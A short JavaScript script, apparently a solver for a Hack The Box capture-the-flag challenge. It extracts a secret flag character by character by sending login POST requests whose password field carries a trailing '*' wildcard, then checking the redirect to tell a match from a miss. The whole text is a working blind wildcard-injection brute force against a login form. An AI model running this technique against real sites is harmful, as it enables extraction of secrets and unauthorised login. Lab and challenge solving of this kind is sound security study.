function getFlag()
{
    //console.clear();
    var strings = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' // alphabets to check
    var i, flag, req; 
    for (i = 0; i < strings.length; i++) // as long as i lower than the length of strings
    {
        flag = 'HTB{' + localStorage.getItem('flag') + strings[i] + '*}'; 
        req = new XMLHttpRequest();
        req.open('POST', location.href, false);
        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        req.send('username=reese&password=' + flag); // Username as reese and pass as flag*

        if (req.responseURL.split('message')[1] === undefined)
        {
            localStorage.setItem('flag', localStorage.getItem('flag') + strings[i]);
        }

        console.clear(); // clear the terminal 
        console.log('HTB{' + localStorage.getItem('flag') + '}'); // concate the flag with HTB prefix -> HTB{ but without the asterisk
    }
}

var i;
for(i = 0; i < 10; i++) // iterate the func 10 times (in case the flag we got is incomplete, then increment the iteration)
{
    getFlag();
}
